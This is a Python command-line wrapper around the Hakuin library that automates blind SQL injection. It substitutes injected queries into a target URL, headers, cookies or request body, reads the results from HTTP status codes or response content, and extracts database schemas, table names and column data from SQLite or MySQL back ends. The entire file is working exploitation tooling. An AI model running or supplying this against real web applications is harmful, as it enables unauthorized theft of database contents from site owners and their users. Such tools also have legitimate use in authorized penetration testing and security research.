import argparse
import json
import logging
import re
import requests
import sys

from hakuin.dbms import SQLite, MySQL
from hakuin import Extractor, Requester



class BytesEncoder(json.JSONEncoder):
    def default(self, o):
        return o.hex() if isinstance(o, bytes) else super().default(o)



class UniversalRequester(Requester):
    RE_INFERENCE = re.compile(r'^(not_)?(.+):(.*)$')
    RE_QUERY_TAG = re.compile(r'{query}')


    def __init__(self, args):
        self.url = args.url
        self.method = args.method
        self.headers = self._process_dict(args.headers)
        self.cookies = self._process_dict(args.cookies)
        self.body = args.body
        self.inference = self._process_inference(args.inference)
        self.dbg = args.dbg


    def _process_dict(self, dict_str):
        if dict_str is None:
            return {}

        dict_str = json.loads(dict_str)
        assert type(dict_str) is dict, 'Headers/cookies must be defined as a dictionary.'

        return {str(k): str(v) for k, v in dict_str.items()}


    def _process_inference(self, inference):
        m = self.RE_INFERENCE.match(inference)

        inf = {
            'type': m.group(2),
            'content': m.group(3),
            'is_negated': m.group(1) is not None,
        }

        assert inf['type'] in ['status', 'header', 'body'], f'Unknown inference type: "{inf["type"]}"'
        if inf['type'] == 'status':
            inf['content'] = int(inf['content'])

        return inf


    def request(self, ctx, query):
        url = self.RE_QUERY_TAG.sub(query, self.url)
        headers = {self.RE_QUERY_TAG.sub(query, k): self.RE_QUERY_TAG.sub(query, v) for k, v in self.headers.items()}
        cookies = {self.RE_QUERY_TAG.sub(query, k): self.RE_QUERY_TAG.sub(query, v) for k, v in self.cookies.items()}
        body = self.RE_QUERY_TAG.sub(query, self.body) if self.body else None

        resp = requests.request(method=self.method, url=url, headers=headers, cookies=cookies, data=body)

        if self.inference['type'] == 'status':
            result = resp.status_code == self.inference['content']
        elif self.inference['type'] == 'header':
            result = any(self.inference['content'] in v for v in resp.headers.keys() + resp.headers.values())
        elif self.inference['type'] == 'body':
            result = self.inference['content'] in resp.content.decode()

        if self.inference['is_negated']:
            result = not result

        if self.dbg:
            print(result, query, file=sys.stderr)

        return result



class HK:
    DBMS_DICT = {
        'sqlite': SQLite,
        'mysql': MySQL,
    }


    def __init__(self, args):
        requester = UniversalRequester(args)
        dbms = self.DBMS_DICT[args.dbms]()
        self.ext = Extractor(requester, dbms)


    def main(self, args):
        if args.schema:
            res = self.ext.extract_schema(strategy=args.schema_strategy)
        elif args.column:
            res = self.ext.extract_column(table=args.table, column=args.column, text_strategy=args.text_strategy)
        elif args.table:
            res = self.extract_table(table=args.table, schema_strategy=args.schema_strategy, text_strategy=args.text_strategy)
        else:
            res = self.extract_tables(schema_strategy=args.schema_strategy, text_strategy=args.text_strategy)

        print(json.dumps(res, cls=BytesEncoder, indent=2))


    def extract_schema(self):
        return self.ext.extract_schema(strategy=self.args.schema_strategy)

    def extract_tables(self, schema_strategy, text_strategy):
        res = []
        for table in self.ext.extract_table_names(strategy=schema_strategy):
            res.append(self.extract_table(table, schema_strategy, text_strategy))
        return res

    def extract_table(self, table, schema_strategy, text_strategy):
        res = {}
        for column in self.ext.extract_column_names(table=table, strategy=schema_strategy):
            try:
                res[column] = self.ext.extract_column(table=table, column=column, text_strategy=text_strategy)
            except Exception as e:
                logging.error(f'Failed to extract "{table}.{column}": {e}')
        return res



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A simple wrapper to easily call Hakuin\'s basic functionality.')
    parser.add_argument('url', help='URL pointing to a vulnerable endpoint. The URL can contain the {query} tag, which will be replaced with injected queries.')
    parser.add_argument('-d', '--dbms', required=True, choices=['sqlite', 'mysql'], help='Assume this DBMS engine.')
    parser.add_argument('-M', '--method', choices=['get', 'post', 'put', 'delete', 'head', 'patch'], default='get', help='HTTP request method.')
    parser.add_argument('-H', '--headers', help='Headers attached to requests. The header names and values can contain the {query} tag.')
    parser.add_argument('-C', '--cookies', help='Cookies attached to requests. The cookie names and values can contain the {query} tag.')
    parser.add_argument('-B', '--body', help='Request body. The body can contain the {query} tag.')
    parser.add_argument('-i', '--inference', required=True, help=' '.join('''
        Inference method that determines the results of injected queries. The method must be in the form of "<TYPE>:<CONTENT>", where the <TYPE>
        can be "status", "header", or "body" and the <CONTENT> can be a status code or a string to look for in HTTP responses. Also, the <TYPE>
        can be prefixed with "not_" to negate the expression. Examples: "status:200" (check if the response status code is 200), "not_status:404"
        (the response status code is not 404), "header:found" (the response header name or value contains "found"), "body:found" (the response body
        contains "found").
    '''.split()))
    parser.add_argument('-t', '--table', help='Table to extract.')
    parser.add_argument('-c', '--column', help='Column to extract.')
    parser.add_argument('-s', '--schema', action='store_true', help='Extract only schema.')
    parser.add_argument('--schema_strategy', choices=['binary', 'model'], default='model', help='Use this strategy to extract schema.')
    parser.add_argument('--text_strategy', choices=['binary', 'unigram', 'fivegram', 'dynamic'], default='dynamic', help='Use this strategy to extract text columns.')
    # parser.add_argument('-o', '--out', help='Output directory.')
    parser.add_argument('--dbg', action='store_true', help='Print debug information to stderr.')
    args = parser.parse_args()

    if args.schema:
        assert not args.table and not args.column, 'Cannot combine the --schema and --table/--column options.'

    if args.column:
        assert args.table, 'You must specify --table when using --column.'

    logging.basicConfig(level=logging.INFO)
    HK(args).main(args)